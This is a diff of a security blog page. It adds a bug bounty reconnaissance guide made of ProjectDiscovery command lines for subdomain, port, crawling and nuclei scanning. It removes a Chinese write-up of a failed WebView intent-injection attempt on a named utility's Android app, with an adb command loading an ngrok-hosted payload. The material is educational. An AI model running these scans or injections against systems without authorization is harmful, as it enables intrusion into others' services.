@@ -126,6 +126,324 @@
 </nav>
       <div class="body-wrap">
   
+    <article id="post-Bug Bounty - Recon1" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2025/10/10/Bug%20Bounty%20-%20Recon1/" class="article-date">
+  	<time datetime="2025-10-09T22:35:17.546Z" itemprop="datePublished">2025-10-10</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2025/10/10/Bug%20Bounty%20-%20Recon1/">
+        Bug Bounty Methodology
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="The-Definitive-Bug-Bounty-Methodology-A-Systemic-Approach-Using-the-Project-Discovery-Toolkit"><a href="#The-Definitive-Bug-Bounty-Methodology-A-Systemic-Approach-Using-the-Project-Discovery-Toolkit" class="headerlink" title="The Definitive Bug Bounty Methodology: A Systemic Approach Using the Project Discovery Toolkit"></a>The Definitive Bug Bounty Methodology: A Systemic Approach Using the Project Discovery Toolkit</h1><p>Successfully navigating the bug bounty landscape requires moving beyond running automated tools “out of the box”—a practice that misses approximately <strong>80% of a tool’s potential</strong>. This guide provides a comprehensive methodology that integrates fundamental hunting skills, strategic target selection, and an advanced, chained reconnaissance workflow using the Project Discovery (PD) toolkit, ensuring that hunters know precisely when and how to deploy each instrument. Reconnaissance (recon) is the foundation, serving both to expand the Attack Surface and to directly expose sensitive data or vulnerabilities.</p>
+<hr>
+<h2 id="I-Establishing-the-Foundation-and-Strategic-Target-Selection"><a href="#I-Establishing-the-Foundation-and-Strategic-Target-Selection" class="headerlink" title="I. Establishing the Foundation and Strategic Target Selection"></a>I. Establishing the Foundation and Strategic Target Selection</h2><p>Before executing any commands, the hunter must possess core skills and implement a strategy to avoid programs already <strong>“picked clean”</strong> by advanced hackers.</p>
+<h3 id="1-Essential-Skills-and-Mindset"><a href="#1-Essential-Skills-and-Mindset" class="headerlink" title="1. Essential Skills and Mindset"></a>1. Essential Skills and Mindset</h3><p>A successful hunt starts with basic proficiency, not mastery:</p>
+<ul>
+<li>Learn to explore websites using tools like <strong>Burp Suite</strong>.</li>
+<li>Practice testing parameters to see if they can be <strong>changed or removed</strong>.</li>
+<li>Perform simple network scans with tools like <strong>nmap</strong>.</li>
+<li>Understand how an application processes inputs or handles session data, which often serves as the first clue to a vulnerability.</li>
+</ul>
+<h3 id="2-Strategic-Target-Selection"><a href="#2-Strategic-Target-Selection" class="headerlink" title="2. Strategic Target Selection"></a>2. Strategic Target Selection</h3><p>Avoid highly competitive platforms like HackerOne or BugCrowd.</p>
+<table>
+<thead>
+<tr>
+<th align="left">Strategy</th>
+<th align="left">Rationale</th>
+<th align="left">Command&#x2F;Resource</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><strong>Start with VDPs</strong></td>
+<td align="left">Vulnerability Disclosure Programs (VDPs) acknowledge findings but usually do not pay bounties; thus, they are largely ignored by advanced hackers, making them prime targets for beginners.</td>
+<td align="left">Use <strong>Google Dorks</strong> or the <strong>Bug Bounty Dorks GitHub repository</strong> to find potential, untested targets.</td>
+</tr>
+<tr>
+<td align="left"><strong>Dig Deeper</strong></td>
+<td align="left">Avoid websites on search result pages one or two, which are often too secure and actively monitored. Instead, check pages <strong>five or six</strong> for overlooked vulnerabilities.</td>
+<td align="left">N&#x2F;A</td>
+</tr>
+<tr>
+<td align="left"><strong>Tool Adaptation</strong></td>
+<td align="left">Use <strong>wordlists specifically designed for the target technology</strong> (e.g., a Drupal wordlist for a Drupal site) rather than generic lists. This ensures smarter hunting by finding hidden files or directories others might miss.</td>
+<td align="left">Tools like <strong>Gobuster</strong> or <strong>Dirb</strong> are excellent for this.</td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="II-Setting-Up-the-Dedicated-Reconnaissance-Box"><a href="#II-Setting-Up-the-Dedicated-Reconnaissance-Box" class="headerlink" title="II. Setting Up the Dedicated Reconnaissance Box"></a>II. Setting Up the Dedicated Reconnaissance Box</h2><p>Effective reconnaissance requires a powerful, dedicated Cloud Virtual Private Server (VPS), recommended to be a <strong>KVM2 plan</strong>. Choose a server location near you or your targets (e.g., Phoenix, Europe, Asia). The sources used <strong>Ubuntu</strong> in the demonstration, although Arch Linux or Kali Linux are also available OS options.</p>
+<h3 id="1-Installing-Core-Dependencies"><a href="#1-Installing-Core-Dependencies" class="headerlink" title="1. Installing Core Dependencies"></a>1. Installing Core Dependencies</h3><p>All PD tools rely on the <strong>Go programming language</strong>.</p>
+<table>
+<thead>
+<tr>
+<th align="left">Command</th>
+<th align="left">Description</th>
+<th align="left">Citation</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><code>sudo apt install zsh</code></td>
+<td align="left">Installs ZSH.</td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left"><code>sudo apt install go</code></td>
+<td align="left">Installs the Go language.</td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left"><code>go install -v github.com/projectdiscovery/pd-tools/cmd/pd-tools@latest</code></td>
+<td align="left">Installs the PD management tool.</td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left"><code>export PATH=$PATH:$HOME/go/bin</code></td>
+<td align="left">Sets up the necessary Go Path.</td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left"><code>pd-tools -ia</code></td>
+<td align="left">Installs <strong>all</strong> Project Discovery tools.</td>
+<td align="left"></td>
+</tr>
+</tbody></table>
+<h3 id="2-Installing-External-Dependencies"><a href="#2-Installing-External-Dependencies" class="headerlink" title="2. Installing External Dependencies"></a>2. Installing External Dependencies</h3><p>Some PD tools rely on third-party software that must be installed manually:</p>
+<table>
+<thead>
+<tr>
+<th align="left">Command</th>
+<th align="left">Description</th>
+<th align="left">Citation</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><code>sudo apt get install nmap</code></td>
+<td align="left">Installs NMAP.</td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left"><code>sudo apt install build-essential</code></td>
+<td align="left">Installs build essentials (required for Mass DNS compilation).</td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left"><code>git clone https://github.com/massdns/massdns.git</code></td>
+<td align="left">Clones the Mass DNS project (Implied step).</td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left"><code>cd massdns &amp;&amp; make</code></td>
+<td align="left">Compiles Mass DNS.</td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left"><code>sudo cp bin/massdns /usr/bin</code></td>
+<td align="left">Copies the Mass DNS executable to a global path.</td>
+<td align="left"></td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="III-Pillar-I-Comprehensive-Asset-Discovery-Workflow"><a href="#III-Pillar-I-Comprehensive-Asset-Discovery-Workflow" class="headerlink" title="III. Pillar I: Comprehensive Asset Discovery Workflow"></a>III. Pillar I: Comprehensive Asset Discovery Workflow</h2><p>Reconnaissance is partitioned into <strong>Asset Discovery</strong> (finding domains, IPs, ports) and <strong>Content Discovery</strong> (finding hackable content). Asset discovery focuses on expanding the attack surface.</p>
+<h3 id="1-Initial-Scanning-and-Subdomain-Enumeration"><a href="#1-Initial-Scanning-and-Subdomain-Enumeration" class="headerlink" title="1. Initial Scanning and Subdomain Enumeration"></a>1. Initial Scanning and Subdomain Enumeration</h3><p>Start by finding initial assets and checking server configuration for known vulnerabilities.</p>
+<table>
+<thead>
+<tr>
+<th align="left">Tool&#x2F;Process</th>
+<th align="left">Command</th>
+<th align="left">Rationale</th>
+<th align="left">Citation</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><strong>Initial Scan (Nmap)</strong></td>
+<td align="left"><em>N&#x2F;A (Conceptual)</em></td>
+<td align="left">Look for version numbers of services running on the server; cross-reference these versions with <strong>Exploit DB</strong> or <strong>Rapid7</strong> for known vulnerabilities.</td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left"><strong>Subfinder (OSINT)</strong></td>
+<td align="left"><code>subfinder -d domain.com -all -recursive &gt; subs_domain.com.txt</code></td>
+<td align="left">Recommended to configure the provider configuration file with API keys (even free ones) and use the <code>-all</code> flag for better data. <code>-recursive</code> digs deeper into discovered subdomains.</td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left"><strong>ShuffleDNS (Brute Force)</strong></td>
+<td align="left"><code>shuffledns -d target.com -w /path/to/wordlist.txt -r /path/to/resolvers.txt -mode brute-force -o domains.txt -silent</code></td>
+<td align="left">Used to find subdomains that Subfinder missed (e.g., behind wildcards or lacking SSL). Requires separate resolvers (e.g., Trius) and robust wordlists (e.g., Sec, Asset Notes).</td>
+<td align="left"></td>
+</tr>
+</tbody></table>
+<h3 id="2-Permutations-and-Resolution"><a href="#2-Permutations-and-Resolution" class="headerlink" title="2. Permutations and Resolution"></a>2. Permutations and Resolution</h3><p>Use the PD tools’ strength of <strong>piping</strong> results to efficiently filter the target list.</p>
+<table>
+<thead>
+<tr>
+<th align="left">Tool</th>
+<th align="left">Command</th>
+<th align="left">Rationale</th>
+<th align="left">Citation</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><strong>AlterX (Permutations)</strong></td>
+<td align="left">&#96;cat domains.txt</td>
+<td align="left">alterx -p &#x2F;path&#x2F;to&#x2F;custom_wordlist.txt&#96;</td>
+<td align="left">Generates new potential subdomains (e.g., QA, dev, API) by combining existing domains with custom keywords. The permutation configurations can be customized via the YAML file.</td>
+</tr>
+<tr>
+<td align="left"><strong>DNSX (Resolution)</strong></td>
+<td align="left">&#96;cat domains.txt</td>
+<td align="left">alterx</td>
+<td align="left">dnsx -o resolved_domains.txt&#96;</td>
+</tr>
+</tbody></table>
+<h3 id="3-Port-Scanning-and-Directory-Brute-Forcing"><a href="#3-Port-Scanning-and-Directory-Brute-Forcing" class="headerlink" title="3. Port Scanning and Directory Brute Forcing"></a>3. Port Scanning and Directory Brute Forcing</h3><p>Instead of relying solely on HTTPX for open ports, <strong>Naboo</strong> is used for deeper scanning.</p>
+<table>
+<thead>
+<tr>
+<th align="left">Tool</th>
+<th align="left">Command</th>
+<th align="left">Rationale</th>
+<th align="left">Citation</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><strong>Naboo (Port Scan)</strong></td>
+<td align="left">&#96;cat resolved_domains.txt</td>
+<td align="left">naboo -p top100 -ep 22 -o openports.txt&#96;</td>
+<td align="left">Scans for ports (e.g., <code>top100</code>). Finds applications running on non-standard ports (e.g., 8443, 9000, 3000).</td>
+</tr>
+<tr>
+<td align="left"><strong>Directory Brute Forcing</strong></td>
+<td align="left"><em>Tools: Dirsearch, FFUF, Gobuster, Dirb</em></td>
+<td align="left">Finds hidden files, backup configurations, or admin portals. This step is often overlooked but critical.</td>
+<td align="left"></td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="IV-Pillar-II-Content-Discovery-and-Vulnerability-Lead-Generation"><a href="#IV-Pillar-II-Content-Discovery-and-Vulnerability-Lead-Generation" class="headerlink" title="IV. Pillar II: Content Discovery and Vulnerability Lead Generation"></a>IV. Pillar II: Content Discovery and Vulnerability Lead Generation</h2><p>The second pillar focuses on gathering high-level intelligence and finding application functionality.</p>
+<h3 id="1-Information-Gathering-HTTPX"><a href="#1-Information-Gathering-HTTPX" class="headerlink" title="1. Information Gathering (HTTPX)"></a>1. Information Gathering (HTTPX)</h3><p>HTTPX provides a high-level overview of the live hosts and their status.</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> openports.txt | httpx -sc -title -cl -location -fr -o httpx_info.txt</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>Key Data Collected:</strong> Status code (<code>-sc</code>), title (<code>-title</code>), content length (<code>-cl</code>), and redirect location (<code>-location</code>). The <code>-fr</code> flag is used to follow redirects.</li>
+<li><strong>Analysis Insight:</strong> Pay attention to titles showing third-party tools like <strong>PHP MyAdmin, Grafana, or Jenkins</strong>, as these are excellent leads for finding CVEs or weak credentials. HTTPX can also filter live hosts based on status, title, and IP.</li>
+</ul>
+<h3 id="2-Deep-and-Authenticated-Crawling-Katana"><a href="#2-Deep-and-Authenticated-Crawling-Katana" class="headerlink" title="2. Deep and Authenticated Crawling (Katana)"></a>2. Deep and Authenticated Crawling (Katana)</h3><p><strong>Katana</strong> is used to find application functionality and endpoints.</p>
+<table>
+<thead>
+<tr>
+<th align="left">Crawling Method</th>
+<th align="left">Command Example</th>
+<th align="left">Rationale</th>
+<th align="left">Citation</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><strong>Deep Crawl</strong></td>
+<td align="left"><code>katana -u https://target.com -jc -jsl -d 5</code></td>
+<td align="left"><code>-jc</code> enables endpoint parsing; <code>-jsl</code> enables JS loose parsing (memory intensive but finds more content, like <code>shop admin</code>, <code>checkout</code>); <code>-d</code> increases the crawling depth.</td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left"><strong>Authenticated Crawl</strong></td>
+<td align="left"><code>katana -u https://target.com -h &quot;Cookie: &lt;cookie_value&gt;&quot; -xhr -aff -jsl</code></td>
+<td align="left"><strong>Highly crucial.</strong> More functionality is visible post-login. Pass cookies via custom headers (<code>-h</code>). Use <code>-xhr</code> to find requests in the DOM and <code>-AFF</code> to automatically fill forms.</td>
+<td align="left"></td>
+</tr>
+</tbody></table>
+<h3 id="3-Vulnerability-Lead-Generation"><a href="#3-Vulnerability-Lead-Generation" class="headerlink" title="3. Vulnerability Lead Generation"></a>3. Vulnerability Lead Generation</h3><p>Pipe Katana results back to HTTPX to check response headers, looking for clues that could lead to injection points.</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Analyze endpoints found by Katana</span></span><br><span class="line"><span class="built_in">cat</span> katana_urls.txt | httpx -sc -content-type -cl</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>Lead Indicator:</strong> If an endpoint is expected to return JSON but HTTPX shows a <code>Content-Type</code> of <code>text/html</code>, it suggests a potential <strong>Cross-Site Scripting (XSS)</strong> vulnerability if HTML injection is possible. The primary goal of recon is to find these leads.</li>
+</ul>
+<hr>
+<h2 id="V-Advanced-Workflows-and-Specialized-Techniques"><a href="#V-Advanced-Workflows-and-Specialized-Techniques" class="headerlink" title="V. Advanced Workflows and Specialized Techniques"></a>V. Advanced Workflows and Specialized Techniques</h2><h3 id="1-Comprehensive-Chained-Workflow"><a href="#1-Comprehensive-Chained-Workflow" class="headerlink" title="1. Comprehensive Chained Workflow"></a>1. Comprehensive Chained Workflow</h3><p>The ideal workflow prioritizes resolution before scanning, minimizing wasted requests.</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Workflow: Subdomains (Subfinder/Chaos) -&gt; Permutations (AlterX) -&gt; Resolution (DNSX) -&gt; Port Scan (Naboo) -&gt; High-Level Info (HTTPX)</span></span><br><span class="line">subfinder -d target.com -silent | alterx | dnsx | naboo -p top100 | httpx -sc -title -cl</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-Passive-and-Historical-Reconnaissance"><a href="#2-Passive-and-Historical-Reconnaissance" class="headerlink" title="2. Passive and Historical Reconnaissance"></a>2. Passive and Historical Reconnaissance</h3><p>When active crawling (Katana) fails (e.g., on legacy apps or certain APIs), passive methods retrieve indexed data.</p>
+<table>
+<thead>
+<tr>
+<th align="left">Tool</th>
+<th align="left">Command</th>
+<th align="left">Rationale</th>
+<th align="left">Citation</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><strong>URL Finder</strong></td>
+<td align="left"><code>urlfinder -d target.com</code></td>
+<td align="left">Accesses various external resources (e.g., Wayback Machine) to gather indexed data. Useful for finding specific parameters or open redirects.</td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left"><strong>GAU &amp; Wayback</strong></td>
+<td align="left"><em>N&#x2F;A (Tools listed)</em></td>
+<td align="left">Used for collecting historical URLs.</td>
+<td align="left"></td>
+</tr>
+</tbody></table>
+<h3 id="3-Automated-Vulnerability-Scanning-Nuclei"><a href="#3-Automated-Vulnerability-Scanning-Nuclei" class="headerlink" title="3. Automated Vulnerability Scanning (Nuclei)"></a>3. Automated Vulnerability Scanning (Nuclei)</h3><p><strong>Nuclei</strong> is a tool for automated scanning. It should be used strategically on the high-quality, live host lists generated by the thorough recon process.</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nuclei -l live_subs_domain.com.txt -rl 10 -bs 2 -c 2 -as -silent -s critical,high,medium</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>Rate Limiting:</strong> <code>-rl 10</code> limits requests to 10 per second, which is essential to avoid overwhelming the target server and getting blocked.</li>
+<li><strong>Concurrency:</strong> Flags like <code>-bs 2</code> (maximum parallel hosts per template) and <code>-c 2</code> (maximum parallel templates) control performance.</li>
+</ul>
+<h3 id="4-Other-Specialized-Reconnaissance-Techniques"><a href="#4-Other-Specialized-Reconnaissance-Techniques" class="headerlink" title="4. Other Specialized Reconnaissance Techniques"></a>4. Other Specialized Reconnaissance Techniques</h3><p>The sources also mention several other advanced techniques that can be integrated into the hunter’s system:</p>
+<ul>
+<li><strong>Parameter Extraction:</strong> Using <strong>Regex</strong> and <strong>GF</strong>. The tool <strong>Arjun</strong> is used for discovering hidden parameters.</li>
+<li><strong>JavaScript Recon:</strong> Detecting endpoints and tokens from JS files.</li>
+<li><strong>Vulnerability Detection:</strong> Advanced techniques include <strong>CORS Misconfiguration Detection</strong>, <strong>SQL Injection Recon</strong>, <strong>XSS Detection</strong>, <strong>Local File Inclusion (LFI) Fuzzing</strong>, <strong>Subdomain Takeover Detection</strong> with <strong>Subzy</strong>, and discovery of <strong>.git Folder Leaks</strong>.</li>
+<li><strong>Visual Reconnaissance:</strong> Using <strong>Aquatone</strong>.</li>
+<li><strong>Port Scanning Alternatives:</strong> <strong>Masscan</strong> is listed alongside Nmap and Naboo.</li>
+<li><strong>Subdomain Enumeration Alternatives:</strong> <strong>Censys</strong> and <strong>Search Spotter</strong> are mentioned alongside Project Discovery tools.</li>
+</ul>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+  
     <article id="OWASP Top 10 Vuln-OWASPTop10" class="article article-type-OWASP Top 10 Vuln" itemscope itemprop="blogPost">
   
     <div class="article-meta">
@@ -3408,133 +3726,6 @@
 <p><img src="/img/wireshark_Untitled_51.png" alt="Untitled"></p>
 <p><img src="/img/wireshark_Untitled_52.png" alt="Untitled"></p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Blad3</span><br></pre></td></tr></table></figure>
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-      
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-  
-    <article id="post-webview" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2024/12/21/webview/" class="article-date">
-  	<time datetime="2024-12-21T12:32:07.098Z" itemprop="datePublished">2024-12-21</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2024/12/21/webview/">
-        Webview Attacks
-        
-      </a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h3 id="failed-attack-process"><a href="#failed-attack-process" class="headerlink" title="failed attack process"></a>failed attack process</h3><p>來說說webview的採坑過程，原本以為有洞，結果後來發現..</p>
-<p>目標是某個公司的apk，通過jadx-gui把apk的所有程式挖出來</p>
-<p>Android WebView 是 Android 作業系統 (OS) 的系統元件，可讓 Android 應用程式直接在應用程式內顯示來自 Web 的內容。 </p>
-<p>WebView 應用程式主要由 Javascript、CSS 和 HTML 檔案組成。基本上，該應用程式是一個或多個網頁。這些網頁構成了您的前端介面。</p>
-<p>如果開發人員想要為應用程式新增瀏覽器功能，他&#x2F;她可以包含 WebView 庫並建立 WebView 類別的實例；這本質上是在應用程式中嵌入了一個瀏覽器來執行渲染網頁和執行 JavaScript 等操作。</p>
-<p>首先，通過弱掃發現了Remote WebView debugging是開啟的狀態</p>
-<p>Remote WebView debugging is enabled. 	</p>
-<p>high 	CWE: CWE-919: Weaknesses in Mobile Applications<br>OWASP Top 10: M1: Improper Platform Usage<br>OWASP MASVS: MSTG-RESILIENCE-2 	</p>
-<p>tw&#x2F;net&#x2F;sun&#x2F;fudon&#x2F;water&#x2F;MainActivity.java</p>
-<p>先找到及確認該功能為啟用</p>
-<p>確認了webview 功能啟用且引用了該功能</p>
-<p><img src="/img/webview.png" alt="Untitled"></p>
-<p>Webview Inten 方案，如果管理不慎可能導致利用漏洞，可能導致XSS攻擊</p>
-<p>查看有權限的componer路徑，有權限訪問才能查看到路徑</p>
-<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">**adb shell dumpsys package | grep tw.net.sun.fudon**</span><br><span class="line">        1283ffd tw.gov.water.twcmobile/tw.net.sun.fudon.water.MainActivity</span><br><span class="line">        1283ffd tw.gov.water.twcmobile/tw.net.sun.fudon.water.MainActivity</span><br></pre></td></tr></table></figure>
-
-<p>setJavaScriptEnabled(true);</p>
-<ul>
-<li>這將允許 webview 在 webview 中運行 javascript。通常用於提供網站的完整功能，但可以被利用</li>
-<li>未經適當保護啟用JavaScript可能會引入安全漏洞</li>
-</ul>
-<p><img src="/img/webview1.png" alt="Untitled"></p>
-<ul>
-<li><strong>enableRemoteDebugging() 啟用 WebView 的遠端偵錯功能</strong><ul>
-<li>在生產環境中啟用了遠端偵錯功能，可能會為攻擊者提供額外的攻擊面</li>
-<li>攻擊者可以利用遠端偵錯功能來竊取敏感資訊、執行惡意程式碼等</li>
-<li>建議在生產環境中停用遠端調試功能</li>
-<li>可以透過在啟動應用程式時檢查建置類型或設定檔中的標誌來控制是否啟用遠端偵錯功能</li>
-</ul>
-</li>
-<li><strong>exposeJsInterface()</strong><ul>
-<li>WebView 中暴露一個 JavaScript 接口，使得 JavaScript 程式碼可以呼叫該接口中的方法</li>
-<li>這種操作可能存在安全風險，特別是如果不正確地處理暴露的接口，可能導致遠端程式碼執行漏洞或其他安全問題</li>
-<li>建議仔細審查和驗證暴露的接口，確保只有受信任的程式碼可以調用，並且避免直接將敏感資料暴露給 JavaScript</li>
-</ul>
-</li>
-</ul>
-<p><img src="/img/webview2.png" alt="Untitled"></p>
-<p>Remote WebView debugging is enabled</p>
-<ul>
-<li>開啟遠端 WebView 偵錯可能會使應用程式容易受到攻擊，尤其是在生產環境中</li>
-<li>攻擊者可以利用遠端 WebView 偵錯來查看應用程式的原始程式碼、注入惡意腳本、竊取敏感資訊等</li>
-<li>確保在生產版本中停用 WebView 的遠端偵錯功能，可以在應用程式的啟動或配置過程中進行設定</li>
-</ul>
-<p>intent.getStringExtra(“url”) </p>
-<ul>
-<li>這會將 extra 的值（此處為 url）儲存到新的字串 url 中</li>
-<li>這邊會關乎到能否去利用webview啟用狀態而進行exploit</li>
-</ul>
-<p><img src="/img/webview3.png" alt="Untitled"></p>
-<p><img src="/img/webview4.png" alt="Untitled"></p>
-<p>但是，看到這邊AndroidManifest.xml裡面的紀錄，</p>
-<p>android:exported&#x3D;”False” 不能注入了QQ</p>
-<p>如果是true，就能進行攻擊了，也就是前面的分析白費，這邊沒啟用就是利用不了</p>
-<p><img src="/img/webview5.png" alt="Untitled"></p>
-<p>可以稍微說下，當初在看程式的時候，看到在這邊是啟用的狀態，覺得很興奮，以為有料能進行利用了</p>
-<p><img src="/img/webview6.png" alt="Untitled"></p>
-<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:theme</span>=<span class="string">&quot;@style/AppTheme.NoActionBarLaunch&quot;</span> <span class="attr">android:label</span>=<span class="string">&quot;@string/title_activity_main&quot;</span> <span class="attr">android:name</span>=<span class="string">&quot;tw.net.sun.fudon.water.MainActivity&quot;</span> <span class="attr">android:exported</span>=<span class="string">&quot;true&quot;</span> <span class="attr">android:launchMode</span>=<span class="string">&quot;singleTask&quot;</span> <span class="attr">android:screenOrientation</span>=<span class="string">&quot;portrait&quot;</span> <span class="attr">android:configChanges</span>=<span class="string">&quot;smallestScreenSize|screenSize|uiMode|screenLayout|orientation|keyboardHidden|keyboard|locale&quot;</span> <span class="attr">android:windowSoftInputMode</span>=<span class="string">&quot;adjustPan&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>所以就去測試了一下，指令如下</p>
-<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">sudo apt-get remove --purge apache2 apache2-utils</span><br><span class="line">sudo apt-get install --reinstall apache2 apache2-utils</span><br><span class="line">sudo service apache2 start</span><br><span class="line">sudo service apache2 status</span><br><span class="line"></span><br><span class="line">root@<span class="attr">MSI</span>:/tmp# ngrok http <span class="number">80</span></span><br><span class="line"><span class="title class_">Usage</span> <span class="keyword">of</span> ngrok requires a verified account and authtoken.</span><br><span class="line"></span><br><span class="line"><span class="title class_">Sign</span> up <span class="keyword">for</span> an <span class="attr">account</span>: <span class="attr">https</span>:<span class="comment">//dashboard.ngrok.com/signup  到官網註冊後會產生以下指令，輸入即可</span></span><br><span class="line"><span class="title class_">Install</span> your <span class="attr">authtoken</span>: <span class="attr">https</span>:<span class="comment">//dashboard.ngrok.com/get-started/your-authtoken</span></span><br><span class="line"></span><br><span class="line"><span class="variable constant_">ERR_NGROK_4018</span></span><br><span class="line"></span><br><span class="line">root@<span class="attr">MSI</span>:/tmp# **ngrok config add-authtoken 2eJvh3PifjXXXXXXXXXXXXXXXXCgLXVK74**</span><br><span class="line"><span class="title class_">Authtoken</span> saved to configuration <span class="attr">file</span>: <span class="regexp">/root/</span>.<span class="property">config</span>/ngrok/ngrok.<span class="property">yml</span></span><br><span class="line">root@<span class="attr">MSI</span>:/tmp# ngrok http <span class="number">80</span></span><br><span class="line"></span><br><span class="line">and use **https ngrok link</span><br><span class="line">記得payload.<span class="property">html</span>要放在ngrok啟用的目錄下**</span><br></pre></td></tr></table></figure>
-
-<p><img src="/img/webview7.png" alt="Untitled"></p>
-<blockquote>
-<p>adb shell am start -n componentname –es string “<a target="_blank" rel="noopener" href="http://domain.com/">domain.com</a>“</p>
-</blockquote>
-<p>componentname 是前面通過 <strong>adb shell dumpsys package</strong> 然後列出的package路徑，如果你的android:exported&#x3D;”True”，就能看到路徑列出，甚至進行利用</p>
-<p>前面列出的路徑是<code>tw.gov.water.twcmobile/tw.net.sun.fudon.water.MainActivity</code></p>
-<p><code>--es</code> 後面接的是intent.getStringExtra裡面塞的東西</p>
-<p>所以指令這樣下</p>
-<p><code>adb shell am start -n tw.gov.water.twcmobile/tw.net.sun.fudon.water.MainActivity --es url &quot; [https://c5b7-210-242-228-139.ngrok-free.app](https://c579-59-120-78-233.ngrok-free.app/)/payload.html&quot;</code></p>
-<p><img src="/img/webview8.png" alt="Untitled"></p>
-<p>但沒有反應，雖然啟動了APP，但重點是因為 <code>tw.net.sun.fudon.water.MainActivity</code> 這邊 <code>android:exported=”False”</code>，所以exploit就失敗了&#x3D;.&#x3D;</p>
-<p>總結來說，有點可惜，因為他很多設置都是啟用狀態，但真的要好好注意 <code>android:exported</code> 是不是 <code>true</code> ，不然會浪費太多時間在測試它，再加上現在Android的版本太高了，導致很多漏洞利用變得困難</p>
-
       
     </div>
     
